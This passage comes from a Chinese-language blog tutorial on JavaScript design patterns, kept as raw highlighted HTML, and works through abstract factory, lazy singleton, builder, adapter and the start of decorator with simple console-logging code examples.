title="抽象工厂模式的实例"></a>抽象工厂模式的实例</h3><p>先把上文说的形状工厂搬过来</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 这是之前上文说的形状工厂</span><span class="token keyword">class</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm a circle"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Rectangle</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm a rectangle"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm a square"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ShapeFactory</span> <span class="token punctuation">{</span>    <span class="token function">getShape</span><span class="token punctuation">(</span>shapeType<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>shapeType<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'CIRCLE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'RECTANGLE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'SQUARE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这时候你已经有形状了，但你觉得不美观，你还需要颜色，那么你这个时候，你又搞了个颜色工厂，如下：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 再新加一个颜色工厂</span><span class="token keyword">class</span> <span class="token class-name">Red</span> <span class="token punctuation">{</span>    <span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"fill red"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Blue</span> <span class="token punctuation">{</span>    <span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"fill blue"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Green</span> <span class="token punctuation">{</span>    <span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"fill green"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ColorFactory</span> <span class="token punctuation">{</span>    <span class="token function">getColor</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'RED'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Red</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'BLUE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Blue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'GREEN'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Green</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>颜色工厂好了，但是你担心，以后工厂多了，不好管理咋办，那还是走之前的套路，把工厂通过抽象工厂生产出来。如下：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 最后添加抽象工厂</span><span class="token keyword">class</span> <span class="token class-name">FactoryProducer</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token function">getFactory</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'SHAPE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ShapeFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'COLOR'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ColorFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>那么这个时候和上文一样只需要new出一个抽象工厂，就能把所有需要的东西拿到手了:</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//通过抽象工厂拿形状工厂</span><span class="token keyword">const</span> shapeFactory <span class="token operator">=</span> FactoryProducer<span class="token punctuation">.</span><span class="token function">getFactory</span><span class="token punctuation">(</span><span class="token string">'SHAPE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 通过工厂拿各种形状</span><span class="token keyword">const</span> shape1 <span class="token operator">=</span> shapeFactory<span class="token punctuation">.</span><span class="token function">getShape</span><span class="token punctuation">(</span><span class="token string">'CIRCLE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shape1<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> shape2 <span class="token operator">=</span> shapeFactory<span class="token punctuation">.</span><span class="token function">getShape</span><span class="token punctuation">(</span><span class="token string">'RECTANGLE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shape2<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> shape3 <span class="token operator">=</span> shapeFactory<span class="token punctuation">.</span><span class="token function">getShape</span><span class="token punctuation">(</span><span class="token string">'SQUARE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shape3<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过抽象工厂拿颜色工厂</span><span class="token keyword">const</span> colorFactory <span class="token operator">=</span> FactoryProducer<span class="token punctuation">.</span><span class="token function">getFactory</span><span class="token punctuation">(</span><span class="token string">'COLOR'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 通过工厂拿各种颜色</span><span class="token keyword">const</span> color1 <span class="token operator">=</span> colorFactory<span class="token punctuation">.</span><span class="token function">getColor</span><span class="token punctuation">(</span><span class="token string">'RED'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>color1<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> color2 <span class="token operator">=</span> colorFactory<span class="token punctuation">.</span><span class="token function">getColor</span><span class="token punctuation">(</span><span class="token string">'BLUE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>color2<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> color3 <span class="token operator">=</span> colorFactory<span class="token punctuation">.</span><span class="token function">getColor</span><span class="token punctuation">(</span><span class="token string">'GREEN'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>color3<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * output： * I'm a circle * I'm a rectangle * I'm a square * fill red * fill blue * fill green */</span></code></pre><h3 id="抽象工厂模式的优势"><a href="#抽象工厂模式的优势" class="headerlink" title="抽象工厂模式的优势"></a>抽象工厂模式的优势</h3><p>那么使用抽象工厂模式的好处和工厂模式的好处很相似，给工厂做了一个统一的出入口，也方便了日后对这个工厂的修改。</p><h2 id="单例模式-Singleton-Pattern"><a href="#单例模式-Singleton-Pattern" class="headerlink" title="单例模式(Singleton Pattern)"></a>单例模式(Singleton Pattern)</h2><p>什么叫单例模式，简单来说就是一个实例只生产一次。</p><h3 id="单例模式的实例"><a href="#单例模式的实例" class="headerlink" title="单例模式的实例"></a>单例模式的实例</h3><p>这个很简单，我觉得可以直接看代码。</p><p>这是一种“懒汉式”写法，还有一种叫饿汉式写法，区别是懒汉使用时才初始化，饿汉则先初始化，用的时候直接给。</p><p>由于js不需要考虑线程安全，所以推荐使用懒汉式写法，饿汉在JS中反而容易产生没必要的垃圾。</p><blockquote><p>惰性单例是指在需要的时候才创建</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">SingleObject</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 防止调用new初始化</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token punctuation">.</span>target <span class="token operator">!=</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> errorMsg <span class="token operator">=</span> <span class="token string">"This is single object,Can't use keyword new!"</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> tipMsg <span class="token operator">=</span> <span class="token string">"You should use method getInstance to get instance。"</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`\n</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>errorMsg<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">\n</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>tipMsg<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 生产单例</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>SingleObject<span class="token punctuation">.</span>instance<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> SingleObject<span class="token punctuation">.</span>instance<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        SingleObject<span class="token punctuation">.</span>instance <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        SingleObject<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> SingleObject<span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>        <span class="token keyword">return</span> SingleObject<span class="token punctuation">.</span>instance<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> instance <span class="token operator">=</span> SingleObject<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>instance<span class="token punctuation">.</span><span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * output: * Hello World! */</span></code></pre><h3 id="单例模式的优势"><a href="#单例模式的优势" class="headerlink" title="单例模式的优势"></a>单例模式的优势</h3><p>对于频繁使用且可重复使用的对象，可以极大来减少内存消耗和没必要的垃圾回收。</p><h3 id="单例模式的使用场景"><a href="#单例模式的使用场景" class="headerlink" title="单例模式的使用场景"></a>单例模式的使用场景</h3><p>在一个系统中，要求一个类有且仅有一个对象，如果出现多个对象就会出现”不良反应“，可以采用单例模式，具体的场景如下：</p><ul><li>在整个项目中需要一个共享访问点或共享数据，例如一个Web上的计数器，可以不用每次把刷新都记录到数据库中，使用单例模式保持计数器的值，并确保是线程安全的；</li><li>需要定义大量的静态常量和静态方法（如工具类）的环境，可以采用单例模式（当然，也可以直接声明为static的方式）。</li><li>在项目开发时有一些对象其实我们只需要一个，比如：线程池、缓存、日志对象等等。</li></ul><h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><p>在软件系统中，有时候面临着“一个复杂对象”的创建工作，其通常由各个部分的子对象用一定的算法构成；由于需求的变化，这个复杂对象的各个部分经常面临着剧烈的变化，但是将它们组合在一起的算法确相对稳定。如何应对这种变化？如何提供一种“封装机制”来隔离出“复杂对象的各个部分”的变化，从而保持系统中的“稳定构建算法”不随着需求改变而改变？这就是要说的建造者模式。</p><p><strong>建造者模式</strong>(Builder pattern)，将一个复杂对象的构建层与其表示层相互分离，使得同样的构建过程可以采用不同的表示。也就是说如果我们用了建造者模式，那么用户就需要指定需要建造的类型就可以得到它们，而具体建造的过程和细节就不需要知道了。</p><p>在<strong>工厂模式</strong>中，对创建的结果都是一个完整的个体，我们对参见的过程不为所知，只了解创建的结果对象。而在建造者模式中我们关心的是对象的创建过程，因此我们通常将创建对象的类模块化，这样使被创建的类的每一个模块都可以得到灵活的运用和高质量的复用。</p><h3 id="白话解释"><a href="#白话解释" class="headerlink" title="白话解释"></a>白话解释</h3><blockquote><p>在建造者模式里，有个指导者(Director)，由指导者来管理建造者，用户是与指导者联系的，指导者联系建造者最后得到产品。即建造者模式可以强制实行一种分步骤进行的建造过程。</p></blockquote><pre class=" language-js"><code class="language-js">    <span class="token comment" spellcheck="true">//产品——产品类</span>    <span class="token keyword">function</span> <span class="token function">Product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>design <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>db <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>front <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>back <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//产品经理——指导类</span>    <span class="token keyword">function</span> <span class="token function">ProductManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>startWork <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>engineer<span class="token punctuation">)</span><span class="token punctuation">{</span>            engineer<span class="token punctuation">.</span><span class="token function">productDesign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            engineer<span class="token punctuation">.</span><span class="token function">frontEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            engineer<span class="token punctuation">.</span><span class="token function">backEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            engineer<span class="token punctuation">.</span><span class="token function">dbManageer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//工程师——建造者类</span>    <span class="token keyword">function</span> <span class="token function">Engineer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>productDesign <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"产品设计好了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dbManageer <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"数据库设计好了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>backEnd <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"后台写好了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>frontEnd <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"前台写好了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>done <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> product <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            product<span class="token punctuation">.</span>design <span class="token operator">=</span> <span class="token string">"done"</span><span class="token punctuation">;</span>            product<span class="token punctuation">.</span>db <span class="token operator">=</span> <span class="token string">"done"</span><span class="token punctuation">;</span>            product<span class="token punctuation">.</span>back <span class="token operator">=</span> <span class="token string">"done"</span><span class="token punctuation">;</span>            product<span class="token punctuation">.</span>front <span class="token operator">=</span> <span class="token string">"done"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> product<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">let</span> engineer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Engineer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> productmanager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProductManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    productmanager<span class="token punctuation">.</span><span class="token function">startWork</span><span class="token punctuation">(</span>engineer<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 产品设计好了</span>    <span class="token comment" spellcheck="true">// 前台写好了</span>        <span class="token comment" spellcheck="true">// 后台写好了</span>        <span class="token comment" spellcheck="true">// 数据库设计好了</span>        <span class="token keyword">let</span> product <span class="token operator">=</span> engineer<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>product<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">/**            Product        back: "done"        db: "done"        design: "done"        front: "done"        */</span></code></pre><h2 id="适配器模式-Adapter-Pattern"><a href="#适配器模式-Adapter-Pattern" class="headerlink" title="适配器模式(Adapter Pattern)"></a>适配器模式(Adapter Pattern)</h2><p>适配器模式是作为两个不同接口的一种聚合，把比如说SD卡适配器，无论使用TF或SD卡或者其它卡，对外输出都是USB接口。</p><h3 id="适配器模式的实例"><a href="#适配器模式的实例" class="headerlink" title="适配器模式的实例"></a>适配器模式的实例</h3><p>首先我们有两个设备一个是Vlc播放器，一个是Mp4播放器，一个需要使用playVlc按钮来播放，一个要使用playMp4来播放。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">VlcPlayer</span> <span class="token punctuation">{</span>    <span class="token function">playVlc</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Playing vlc file. Name: "</span><span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Mp4Player</span>  <span class="token punctuation">{</span>    <span class="token function">playMp4</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Playing mp4 file. Name: "</span><span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>但是我就想通过一个播放按钮来播放，我不管他是什么播放设备，这个时候，我们就需要一个适配器来做这个事情。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">MediaAdapter</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>audioType<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>audioType<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'vlc'</span><span class="token punctuation">:</span>                MediaAdapter<span class="token punctuation">.</span>advancedMusicPlayer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VlcPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'mp4'</span><span class="token punctuation">:</span>                MediaAdapter<span class="token punctuation">.</span>advancedMusicPlayer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mp4Player</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">play</span><span class="token punctuation">(</span>audioType<span class="token punctuation">,</span> fileName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>audioType<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'vlc'</span><span class="token punctuation">:</span>                MediaAdapter<span class="token punctuation">.</span>advancedMusicPlayer<span class="token punctuation">.</span><span class="token function">playVlc</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'mp4'</span><span class="token punctuation">:</span>                MediaAdapter<span class="token punctuation">.</span>advancedMusicPlayer<span class="token punctuation">.</span><span class="token function">playMp4</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>通过适配器我们可以把各种设备桥接到一个音频设备上。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">AudioPlayer</span><span class="token punctuation">{</span>    <span class="token function">play</span><span class="token punctuation">(</span>audioType<span class="token punctuation">,</span> fileName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>audioType<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'mp3'</span><span class="token punctuation">:</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Playing mp3 file. Name: "</span><span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'vlc'</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> <span class="token string">'mp4'</span><span class="token punctuation">:</span>                    AudioPlayer<span class="token punctuation">.</span>mediaAdapter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MediaAdapter</span><span class="token punctuation">(</span>audioType<span class="token punctuation">)</span><span class="token punctuation">;</span>                    AudioPlayer<span class="token punctuation">.</span>mediaAdapter<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span>audioType<span class="token punctuation">,</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Invalid media. "</span><span class="token operator">+</span>                    audioType <span class="token operator">+</span> <span class="token string">" format not supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span></code></pre><p>那么这个时候我们就可以直接通过这个音频设备来播放我们想要播放的音频了</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> audioPlayer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AudioPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> audioPlayer<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token string">"mp3"</span><span class="token punctuation">,</span> <span class="token string">"beyond the horizon.mp3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> audioPlayer<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token string">"mp4"</span><span class="token punctuation">,</span> <span class="token string">"alone.mp4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> audioPlayer<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token string">"vlc"</span><span class="token punctuation">,</span> <span class="token string">"far far away.vlc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> audioPlayer<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token string">"avi"</span><span class="token punctuation">,</span> <span class="token string">"mind me.avi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**  * output:  * Playing mp3 file. Name: beyond the horizon.mp3  * Playing mp4 file. Name: alone.mp4  * Playing vlc file. Name: far far away.vlc  * Invalid media. avi format not supported  */</span></code></pre><h3 id="适配器模式的优势"><a href="#适配器模式的优势" class="headerlink" title="适配器模式的优势"></a>适配器模式的优势</h3><p>可以让两个不同接口作为一个适配的接口使用，这样对下层的关心可以减少.</p><h2 id="装饰器模式-Decorator-Pattern"><a href="#装饰器模式-Decorator-Pattern" class="headerlink" title="装饰器模式(Decorator Pattern)"></a>装饰器模式(Decorator Pattern)</h2><p>装饰器模式实现了不改变原有对象，在原有对象上实现功能的添加。这是一种对原有对象的一种包装。</p><h3 id="装饰器模式的实例"><a href="#装饰器模式的实例" class="headerlink" title="装饰器模式的实例"></a>装饰器模式的实例</h3><p>假设现在有两个形状，一个矩形一个圆形，这时候我们希望能在形状上实现一些特殊的功能，但又不改变原来的类，我们要如何做呢？</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Rectangle</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Shape: Rectangle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token 